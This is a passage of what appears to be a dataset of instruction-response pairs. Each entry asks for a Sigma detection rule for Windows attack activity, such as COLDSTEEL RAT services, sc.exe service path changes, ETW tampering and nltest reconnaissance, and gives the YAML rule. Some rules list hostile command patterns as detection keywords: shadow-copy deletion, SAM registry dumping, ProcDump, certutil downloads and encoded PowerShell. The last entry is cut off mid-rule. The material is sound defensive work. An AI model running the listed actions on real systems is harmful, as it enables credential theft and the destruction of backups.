    "instruction": "Build a Sigma rule with the goal of detecting creation of new services potentially related to COLDSTEEL RAT.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of new services potentially related to COLDSTEEL RAT, you should: Monitor Windows system logs for events indicating the creation of new services. Focus specifically on logs from the Service Control Manager with an Event ID of 7045. This event signals that a new service has been installed in the system. Pay special attention to services named 'Name', 'msupdate', or 'msupdate2'. Additionally, scrutinize the ImagePath field for any instances containing the path '\\Windows\\System32\\svchost.exe', as this is a common tactic used by malware to disguise themselves as legitimate Windows services. False positives are considered unlikely, indicating the detection methods are highly specific and closely associated with malicious activity. The severity level of this activity is marked as high due to its potential impact related to the COLDSTEEL RAT, implicating this monitoring strategy as critical for identifying and mitigating threats early on.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName:\n            - 'Name'\n            - 'msupdate'\n            - 'msupdate2'\n        ImagePath|contains: '\\Windows\\System32\\svchost.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName:\n            - 'Name'\n            - 'msupdate'\n            - 'msupdate2'\n        ImagePath|contains: '\\Windows\\System32\\svchost.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "creation of new services potentially related to COLDSTEEL RAT",
      "answer": "In order to detect the creation of new services potentially related to COLDSTEEL RAT, you should: Monitor Windows system logs for events indicating the creation of new services. Focus specifically on logs from the Service Control Manager with an Event ID of 7045. This event signals that a new service has been installed in the system. Pay special attention to services named 'Name', 'msupdate', or 'msupdate2'. Additionally, scrutinize the ImagePath field for any instances containing the path '\\Windows\\System32\\svchost.exe', as this is a common tactic used by malware to disguise themselves as legitimate Windows services. False positives are considered unlikely, indicating the detection methods are highly specific and closely associated with malicious activity. The severity level of this activity is marked as high due to its potential impact related to the COLDSTEEL RAT, implicating this monitoring strategy as critical for identifying and mitigating threats early on."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting service path modification via the \"sc\" binary to a suspicious command or path.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect service path modification via the \"sc\" binary to a suspicious command or path, you should: Monitor Windows process creation logs for instances where the process image ends with '\\sc.exe'. This indicates the use of the Service Control (\u201csc\u201d) command-line utility to modify service configurations. Specifically, focus on command line activities that include both 'config' and 'binPath', which are commands used to modify the service binary path. Additionally, scrutinize any usage of highly sensitive or scripting commands such as 'powershell', 'cmd', 'mshta', 'wscript', 'cscript', 'rundll32', 'svchost', 'dllhost', as well as different forms of 'cmd.exe' executions ('cmd.exe /c', '/k', '/r') and their shorter versions ('cmd /c', '/k', '/r'). It is equally important to pay attention to processes being invoked from or involving suspicious paths like 'C:\\Users\\Public', any '\\Downloads\\' or '\\Desktop\\' folders, the Windows Start Menu startup folder, and various temporary directories ('C:\\Windows\\TEMP\\', '\\AppData\\Local\\Temp'). Any detections matching these criteria should be carefully investigated, as they signify a high likelihood of an attacker modifying service paths to execute malicious or unauthorized commands. Recorded command line parameters and their parent processes should be included in the monitoring for a fuller context of the suspicious activity. This method is robust with very few to unlikely false positives and hence, when such patterns are observed, they bear a high level of scrutiny.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'config'\n            - 'binPath'\n        CommandLine|contains:\n            # Add more suspicious commands or binaries\n            - 'powershell'\n            - 'cmd '\n            - 'mshta'\n            - 'wscript'\n            - 'cscript'\n            - 'rundll32'\n            - 'svchost'\n            - 'dllhost'\n            - 'cmd.exe /c'\n            - 'cmd.exe /k'\n            - 'cmd.exe /r'\n            - 'cmd /c'\n            - 'cmd /k'\n            - 'cmd /r'\n            # Add more suspicious paths\n            - 'C:\\Users\\Public'\n            - '\\Downloads\\'\n            - '\\Desktop\\'\n            - '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'\n            - 'C:\\Windows\\TEMP\\'\n            - '\\AppData\\Local\\Temp'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'config'\n            - 'binPath'\n        CommandLine|contains:\n            # Add more suspicious commands or binaries\n            - 'powershell'\n            - 'cmd '\n            - 'mshta'\n            - 'wscript'\n            - 'cscript'\n            - 'rundll32'\n            - 'svchost'\n            - 'dllhost'\n            - 'cmd.exe /c'\n            - 'cmd.exe /k'\n            - 'cmd.exe /r'\n            - 'cmd /c'\n            - 'cmd /k'\n            - 'cmd /r'\n            # Add more suspicious paths\n            - 'C:\\Users\\Public'\n            - '\\Downloads\\'\n            - '\\Desktop\\'\n            - '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'\n            - 'C:\\Windows\\TEMP\\'\n            - '\\AppData\\Local\\Temp'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "service path modification via the \"sc\" binary to a suspicious command or path",
      "answer": "In order to detect service path modification via the \"sc\" binary to a suspicious command or path, you should: Monitor Windows process creation logs for instances where the process image ends with '\\sc.exe'. This indicates the use of the Service Control (\u201csc\u201d) command-line utility to modify service configurations. Specifically, focus on command line activities that include both 'config' and 'binPath', which are commands used to modify the service binary path. Additionally, scrutinize any usage of highly sensitive or scripting commands such as 'powershell', 'cmd', 'mshta', 'wscript', 'cscript', 'rundll32', 'svchost', 'dllhost', as well as different forms of 'cmd.exe' executions ('cmd.exe /c', '/k', '/r') and their shorter versions ('cmd /c', '/k', '/r'). It is equally important to pay attention to processes being invoked from or involving suspicious paths like 'C:\\Users\\Public', any '\\Downloads\\' or '\\Desktop\\' folders, the Windows Start Menu startup folder, and various temporary directories ('C:\\Windows\\TEMP\\', '\\AppData\\Local\\Temp'). Any detections matching these criteria should be carefully investigated, as they signify a high likelihood of an attacker modifying service paths to execute malicious or unauthorized commands. Recorded command line parameters and their parent processes should be included in the monitoring for a fuller context of the suspicious activity. This method is robust with very few to unlikely false positives and hence, when such patterns are observed, they bear a high level of scrutiny."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Remote registry management using REG utility from non-admin workstation.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect instances of remote registry management using REG utility from non-admin workstations, you should focus on monitoring Windows security logs. Specifically, look for events with the Event ID 5145, which indicates an attempt to access network shared objects. This activity becomes particularly interesting when the accessed object is related to the Windows Registry, as denoted by the access path containing '\\winreg'. \n\nTo ensure that legitimate administrative activity does not generate unnecessary alerts, any access attempts made from known administrators' workstations should be excluded from this detection mechanism. This approach helps in identifying potentially malicious or unauthorized attempts to use the REG utility for registry modifications from machines that are not recognized as administrative workstations. \n\nBe aware that while monitoring for this behavior is crucial for detecting unauthorized remote registry management attempts, there could be instances where legitimate usage triggers an alert. Such legitimate cases typically involve administrators performing valid remote registry operations from non-standard workstations. \n\nThe primary focus on security event logs, combined with the specific conditions around Event ID 5145 and the exclusion of known admin workstations, aligns this detection strategy with tactics and techniques associated with Persistence, Privilege Escalation, and Defense Evasion. Identifying unauthorized access to the Windows Registry via remote management tools is a critical step in mitigating potential threats that exploit registry modifications for malicious purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        RelativeTargetName|contains: '\\winreg'\n    filter_main:\n        IpAddress: '%Admins_Workstations%'\n    condition: selection and not filter_main\nfalsepositives:\n    - Legitimate usage of remote registry management by administrator\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        RelativeTargetName|contains: '\\winreg'\n    filter_main:\n        IpAddress: '%Admins_Workstations%'\n    condition: selection and not filter_main\nfalsepositives:\n    - Legitimate usage of remote registry management by administrator\nlevel: medium\n",
      "question": "Remote registry management using REG utility from non-admin workstation",
      "answer": "In order to detect instances of remote registry management using REG utility from non-admin workstations, you should focus on monitoring Windows security logs. Specifically, look for events with the Event ID 5145, which indicates an attempt to access network shared objects. This activity becomes particularly interesting when the accessed object is related to the Windows Registry, as denoted by the access path containing '\\winreg'. \n\nTo ensure that legitimate administrative activity does not generate unnecessary alerts, any access attempts made from known administrators' workstations should be excluded from this detection mechanism. This approach helps in identifying potentially malicious or unauthorized attempts to use the REG utility for registry modifications from machines that are not recognized as administrative workstations. \n\nBe aware that while monitoring for this behavior is crucial for detecting unauthorized remote registry management attempts, there could be instances where legitimate usage triggers an alert. Such legitimate cases typically involve administrators performing valid remote registry operations from non-standard workstations. \n\nThe primary focus on security event logs, combined with the specific conditions around Event ID 5145 and the exclusion of known admin workstations, aligns this detection strategy with tactics and techniques associated with Persistence, Privilege Escalation, and Defense Evasion. Identifying unauthorized access to the Windows Registry via remote management tools is a critical step in mitigating potential threats that exploit registry modifications for malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of powershell cmdlets to disable or remove ETW trace sessions.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of powershell cmdlets to disable or remove ETW trace sessions, you should: Focus on monitoring PowerShell script actions within Windows environments, specifically looking for Script Block Logging entries. Ensure Script Block Logging is enabled for in-depth insight. Watch for specific patterns within the ScriptBlockText: the command 'Remove-EtwTraceProvider ' indicating an attempt to remove Event Tracing for Windows (ETW) trace providers, and sequences involving 'Set-EtwTraceProvider ' combined with '0x11', which are indicative of attempts to modify the \"Enable\" property of a provider, potentially disabling it. The detection strategy relies on catching either one of these behaviors as a sign of the attack. It is crucial to be vigilant for false positives, although they are currently unspecified. This monitoring stands at a high level of importance due to the nature of the actions being indicative of attempts to undermine system logging and monitoring capabilities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_pwsh_remove:   #Autologger provider removal\n        ScriptBlockText|contains: 'Remove-EtwTraceProvider '\n    selection_pwsh_set:   #Provider \u201cEnable\u201d property modification\n        ScriptBlockText|contains|all:\n            - 'Set-EtwTraceProvider '\n            - '0x11'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_pwsh_remove:   #Autologger provider removal\n        ScriptBlockText|contains: 'Remove-EtwTraceProvider '\n    selection_pwsh_set:   #Provider \u201cEnable\u201d property modification\n        ScriptBlockText|contains|all:\n            - 'Set-EtwTraceProvider '\n            - '0x11'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "usage of powershell cmdlets to disable or remove ETW trace sessions",
      "answer": "In order to detect usage of powershell cmdlets to disable or remove ETW trace sessions, you should: Focus on monitoring PowerShell script actions within Windows environments, specifically looking for Script Block Logging entries. Ensure Script Block Logging is enabled for in-depth insight. Watch for specific patterns within the ScriptBlockText: the command 'Remove-EtwTraceProvider ' indicating an attempt to remove Event Tracing for Windows (ETW) trace providers, and sequences involving 'Set-EtwTraceProvider ' combined with '0x11', which are indicative of attempts to modify the \"Enable\" property of a provider, potentially disabling it. The detection strategy relies on catching either one of these behaviors as a sign of the attack. It is crucial to be vigilant for false positives, although they are currently unspecified. This monitoring stands at a high level of importance due to the nature of the actions being indicative of attempts to undermine system logging and monitoring capabilities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting PowerShell module creation where the module Contents are set to \"function Get-VMRemoteFXPhysicalVideoAdapter\". This could be a sign of potential abuse of  the \"RemoteFXvGPUDisablement.exe\" binary which is known to be vulnerable to module load-order hijacking..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect PowerShell module creation where the module Contents are set to \"function Get-VMRemoteFXPhysicalVideoAdapter\". This could be a sign of potential abuse of the \"RemoteFXvGPUDisablement.exe\" binary which is known to be vulnerable to module load-order hijacking, you should: Monitor Windows PowerShell Classic service logs for activities involving the creation of PowerShell modules with specific contents. Specifically, search for instances where data contains the function definition 'ModuleContents=function Get-VMRemoteFXPhysicalVideoAdapter {'. This specific function could indicate an attempt to exploit vulnerabilities in the \"RemoteFXvGPUDisablement.exe\" binary, often by manipulating the module load order which can lead to unauthorized actions or access. It is important to consider that there might be false positives since the nature or intent of PowerShell module creation can be unknown or benign. The criticality of monitoring this activity is high due to the potential security implications associated with the exploitation of known vulnerabilities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: powershell-classic\n    definition: fields have to be extract from event\ndetection:\n    selection:\n        Data|contains: 'ModuleContents=function Get-VMRemoteFXPhysicalVideoAdapter {'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: powershell-classic\n    definition: fields have to be extract from event\ndetection:\n    selection:\n        Data|contains: 'ModuleContents=function Get-VMRemoteFXPhysicalVideoAdapter {'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "PowerShell module creation where the module Contents are set to \"function Get-VMRemoteFXPhysicalVideoAdapter\". This could be a sign of potential abuse of  the \"RemoteFXvGPUDisablement.exe\" binary which is known to be vulnerable to module load-order hijacking.",
      "answer": "In order to detect PowerShell module creation where the module Contents are set to \"function Get-VMRemoteFXPhysicalVideoAdapter\". This could be a sign of potential abuse of the \"RemoteFXvGPUDisablement.exe\" binary which is known to be vulnerable to module load-order hijacking, you should: Monitor Windows PowerShell Classic service logs for activities involving the creation of PowerShell modules with specific contents. Specifically, search for instances where data contains the function definition 'ModuleContents=function Get-VMRemoteFXPhysicalVideoAdapter {'. This specific function could indicate an attempt to exploit vulnerabilities in the \"RemoteFXvGPUDisablement.exe\" binary, often by manipulating the module load order which can lead to unauthorized actions or access. It is important to consider that there might be false positives since the nature or intent of PowerShell module creation can be unknown or benign. The criticality of monitoring this activity is high due to the potential security implications associated with the exploitation of known vulnerabilities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting nltest commands that can be used for information discovery.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect nltest commands that can be used for information discovery, you should: Monitor process creation logs on Windows systems for indications of nltest.exe or a file with the original name nltestrk.exe being executed. Specifically, pay attention to command lines that include certain flags indicative of reconnaissance or information discovery activities. These flags include combinations like '/server' and '/query' together, or any of the following: '/dclist:', '/parentdomain', '/domain_trusts', '/all_trusts', '/trusted_domains', and '/user'. Such activities should raise a red flag, especially when originating from unexpected sources or showing unusual patterns, despite the fact that there could be legitimate administrative uses. In these instances, further investigation into the user and the host from which the commands are being run is warranted. The severity of these findings is considered high due to the potential for these commands to reveal sensitive information about the network that could aid an attacker in further actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_nltest:\n        - Image|endswith: '\\nltest.exe'\n        - OriginalFileName: 'nltestrk.exe'\n    selection_recon1:\n        CommandLine|contains|all:\n            - '/server'\n            - '/query'\n    selection_recon2:\n        CommandLine|contains:\n            - '/dclist:'\n            - '/parentdomain'\n            - '/domain_trusts'\n            - '/all_trusts' # Flag for /domain_trusts\n            - '/trusted_domains'\n            - '/user'\n    condition: selection_nltest and 1 of selection_recon*\nfields:\n    - Image\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate administration use but user and host must be investigated\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_nltest:\n        - Image|endswith: '\\nltest.exe'\n        - OriginalFileName: 'nltestrk.exe'\n    selection_recon1:\n        CommandLine|contains|all:\n            - '/server'\n            - '/query'\n    selection_recon2:\n        CommandLine|contains:\n            - '/dclist:'\n            - '/parentdomain'\n            - '/domain_trusts'\n            - '/all_trusts' # Flag for /domain_trusts\n            - '/trusted_domains'\n            - '/user'\n    condition: selection_nltest and 1 of selection_recon*\nfields:\n    - Image\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate administration use but user and host must be investigated\nlevel: high\n",
      "question": "nltest commands that can be used for information discovery",
      "answer": "In order to detect nltest commands that can be used for information discovery, you should: Monitor process creation logs on Windows systems for indications of nltest.exe or a file with the original name nltestrk.exe being executed. Specifically, pay attention to command lines that include certain flags indicative of reconnaissance or information discovery activities. These flags include combinations like '/server' and '/query' together, or any of the following: '/dclist:', '/parentdomain', '/domain_trusts', '/all_trusts', '/trusted_domains', and '/user'. Such activities should raise a red flag, especially when originating from unexpected sources or showing unusual patterns, despite the fact that there could be legitimate administrative uses. In these instances, further investigation into the user and the host from which the commands are being run is warranted. The severity of these findings is considered high due to the potential for these commands to reveal sensitive information about the network that could aid an attacker in further actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting flags often used with the LOLBAS Esentutl for malicious activity. It could be used in rare cases by administrators to access locked files or during maintenance..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect flags often used with the LOLBAS Esentutl for malicious activity, which could be used in rare cases by administrators to access locked files or during maintenance, you should: Monitor process creation logs in Windows systems for command lines that contain both the '/vss' and '/y' flags. These specific arguments are typically associated with potentially malicious utilization of the Esentutl utility to manipulate or access locked files, which is a behavior often observed in various attack scenarios. It's important to note significant occurrences when these command line arguments are present together, as they could indicate an ongoing or attempted compromise. However, also be aware that these flags could appear in legitimate administrative or maintenance tasks. Therefore, while detections at this level are considered high importance, it's necessary to investigate and differentiate between malicious activities and benign, administrative use to minimize false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' /vss '\n            - ' /y '\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' /vss '\n            - ' /y '\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
      "question": "flags often used with the LOLBAS Esentutl for malicious activity. It could be used in rare cases by administrators to access locked files or during maintenance.",
      "answer": "In order to detect flags often used with the LOLBAS Esentutl for malicious activity, which could be used in rare cases by administrators to access locked files or during maintenance, you should: Monitor process creation logs in Windows systems for command lines that contain both the '/vss' and '/y' flags. These specific arguments are typically associated with potentially malicious utilization of the Esentutl utility to manipulate or access locked files, which is a behavior often observed in various attack scenarios. It's important to note significant occurrences when these command line arguments are present together, as they could indicate an ongoing or attempted compromise. However, also be aware that these flags could appear in legitimate administrative or maintenance tasks. Therefore, while detections at this level are considered high importance, it's necessary to investigate and differentiate between malicious activities and benign, administrative use to minimize false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious, you should: Focus on monitoring set value events within the Windows registry, specifically those that target the registry path associated with the 'TaskCache' of the Windows Scheduler. This involves looking for any modification attempts to 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\'.\n\nIt's critical to exclude changes made by a set of known and trusted Windows processes which might legitimately interact with scheduled tasks. These trusted processes include but are not limited to, Windows Update Orchestrator, Software Protection Platform SvcRestartTask, Flighting OneSettings RefreshCache, the Trusted Installer Worker (TiWorker.exe) when it's located in the Windows directory, the .NET Framework Native Image Generator (ngen.exe), particularly when it's modifying keys associated with the .NET Framework NGEN tasks, Microsoft Office's Click-To-Run integrator, the MSI installer (msiexec.exe), the Dropbox updater, and the Windows File Explorer when it interacts with specific Performance Monitor scheduled tasks. Furthermore, any modifications initiated by the system itself should be disregarded as benign.\n\nThis monitoring is aimed at identifying potential malicious activity where attackers might register new tasks to maintain persistence or escalate privileges without using the standard `svchost.exe` process for task manipulation, which might indicate an evasion attempt. This detection strategy is aligned with various MITRE ATT&CK techniques such as Persistence, Privilege Escalation, and Execution, providing a valuable layer of defense against stealthy threats aiming to manipulate scheduled tasks for malicious purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\'\n    filter:\n        TargetObject|contains:\n            - 'Microsoft\\Windows\\UpdateOrchestrator'\n            - 'Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask\\Index'\n            - 'Microsoft\\Windows\\Flighting\\OneSettings\\RefreshCache\\Index'\n    filter_tiworker:\n        Image|startswith: 'C:\\Windows\\'\n        Image|endswith: '\\TiWorker.exe'\n    filter_svchost:\n        Image: 'C:\\WINDOWS\\system32\\svchost.exe'\n    filter_ngen:\n        Image|startswith: 'C:\\Windows\\Microsoft.NET\\Framework' # \\Framework\\ and \\Framework64\\\n        Image|endswith: '\\ngen.exe'\n        TargetObject|contains:\n            - '\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{B66B135D-DA06-4FC4-95F8-7458E1D10129}'\n            - '\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN'\n    filter_office_click_to_run:\n        Image:\n            - 'C:\\Program Files\\Microsoft Office\\root\\Integration\\Integrator.exe'\n            - 'C:\\Program Files (x86)\\Microsoft Office\\root\\Integration\\Integrator.exe'\n    filter_msiexec:\n        Image: 'C:\\Windows\\System32\\msiexec.exe'\n    filter_dropbox_updater:\n        Image:\n            - 'C:\\Program Files (x86)\\Dropbox\\Update\\DropboxUpdate.exe'\n            - 'C:\\Program Files\\Dropbox\\Update\\DropboxUpdate.exe'\n    filter_explorer:\n        Image: 'C:\\Windows\\explorer.exe'\n        TargetObject|contains: '\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\\'\n    filter_system:\n        Image: 'System'\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\'\n    filter:\n        TargetObject|contains:\n            - 'Microsoft\\Windows\\UpdateOrchestrator'\n            - 'Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask\\Index'\n            - 'Microsoft\\Windows\\Flighting\\OneSettings\\RefreshCache\\Index'\n    filter_tiworker:\n        Image|startswith: 'C:\\Windows\\'\n        Image|endswith: '\\TiWorker.exe'\n    filter_svchost:\n        Image: 'C:\\WINDOWS\\system32\\svchost.exe'\n    filter_ngen:\n        Image|startswith: 'C:\\Windows\\Microsoft.NET\\Framework' # \\Framework\\ and \\Framework64\\\n        Image|endswith: '\\ngen.exe'\n        TargetObject|contains:\n            - '\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{B66B135D-DA06-4FC4-95F8-7458E1D10129}'\n            - '\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN'\n    filter_office_click_to_run:\n        Image:\n            - 'C:\\Program Files\\Microsoft Office\\root\\Integration\\Integrator.exe'\n            - 'C:\\Program Files (x86)\\Microsoft Office\\root\\Integration\\Integrator.exe'\n    filter_msiexec:\n        Image: 'C:\\Windows\\System32\\msiexec.exe'\n    filter_dropbox_updater:\n        Image:\n            - 'C:\\Program Files (x86)\\Dropbox\\Update\\DropboxUpdate.exe'\n            - 'C:\\Program Files\\Dropbox\\Update\\DropboxUpdate.exe'\n    filter_explorer:\n        Image: 'C:\\Windows\\explorer.exe'\n        TargetObject|contains: '\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\\'\n    filter_system:\n        Image: 'System'\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious",
      "answer": "In order to monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious, you should: Focus on monitoring set value events within the Windows registry, specifically those that target the registry path associated with the 'TaskCache' of the Windows Scheduler. This involves looking for any modification attempts to 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\'.\n\nIt's critical to exclude changes made by a set of known and trusted Windows processes which might legitimately interact with scheduled tasks. These trusted processes include but are not limited to, Windows Update Orchestrator, Software Protection Platform SvcRestartTask, Flighting OneSettings RefreshCache, the Trusted Installer Worker (TiWorker.exe) when it's located in the Windows directory, the .NET Framework Native Image Generator (ngen.exe), particularly when it's modifying keys associated with the .NET Framework NGEN tasks, Microsoft Office's Click-To-Run integrator, the MSI installer (msiexec.exe), the Dropbox updater, and the Windows File Explorer when it interacts with specific Performance Monitor scheduled tasks. Furthermore, any modifications initiated by the system itself should be disregarded as benign.\n\nThis monitoring is aimed at identifying potential malicious activity where attackers might register new tasks to maintain persistence or escalate privileges without using the standard `svchost.exe` process for task manipulation, which might indicate an evasion attempt. This detection strategy is aligned with various MITRE ATT&CK techniques such as Persistence, Privilege Escalation, and Execution, providing a valuable layer of defense against stealthy threats aiming to manipulate scheduled tasks for malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious process creation as SYSTEM user (suspicious program or command line parameter).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious process creation as SYSTEM user (suspicious program or command line parameter), you should: monitor the creation of processes on Windows systems, specifically focusing on events where the process is initiated with System integrity level. Pay close attention to processes initiated by users with names containing variations of \"AUTHORI\" or \"AUTORI\", which are aimed to cover various language settings. \n\nSpecial attention should be given to processes that involve the execution of specific applications such as calculator (calc.exe), Windows Script Host (wscript.exe, cscript.exe), HTML Help (hh.exe), Microsoft HTML Application Host (mshta.exe), forfiles, and ping command executables. These executables are often leveraged in malicious activities when paired with suspicious command line parameters that include, but are not limited to, stopping system services, running PowerShell commands with hidden windows or encoded commands, utilizing certutil for encoding or caching commands, interacting with shadow copies (often in ransomware attacks), extracting system keys, modifying registry entries for persistence, downloading files via PowerShell, using Rubeus and Mimikatz for credential theft and manipulation, invoking in-memory execution with Invoke-Expression (IEx) in PowerShell, and process dumping methods for data exfiltration.\n\nThe detection strategy should exclude known benign activities such as administrative actions, regular scripts, and tools used by systems administrators, as well as specific monitoring tools activities. This methodology aims to minimize false positives while effectively identifying and responding to potential security threats indicated by the attempted or successful creation of processes under the SYSTEM integrity level, involving either suspicious executables or command-line arguments.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        IntegrityLevel: System\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    selection_special:\n        - Image|endswith:\n            - '\\calc.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\hh.exe'\n            - '\\mshta.exe'\n            - '\\forfiles.exe'\n            - '\\ping.exe'\n        - CommandLine|contains:\n            # - 'sc stop ' # stops a system service # causes FPs\n            - ' -NoP '  # Often used in malicious PowerShell commands\n            - ' -W Hidden '  # Often used in malicious PowerShell commands\n            - ' -decode '  # Used with certutil\n            - ' /decode '  # Used with certutil\n            - ' /urlcache '  # Used with certutil\n            - ' -urlcache '  # Used with certutil\n            - ' -e* JAB'  # PowerShell encoded commands\n            - ' -e* SUVYI'  # PowerShell encoded commands\n            - ' -e* SQBFAFgA'  # PowerShell encoded commands\n            - ' -e* aWV4I'  # PowerShell encoded commands\n            - ' -e* IAB'  # PowerShell encoded commands\n            - ' -e* PAA'  # PowerShell encoded commands\n            - ' -e* aQBlAHgA'  # PowerShell encoded commands\n            - 'vssadmin delete shadows'  # Ransomware\n            - 'reg SAVE HKLM'  # save registry SAM - syskey extraction\n            - ' -ma '  # ProcDump\n            - 'Microsoft\\Windows\\CurrentVersion\\Run'  # Run key in command line - often in combination with REG ADD\n            - '.downloadstring('  # PowerShell download command\n            - 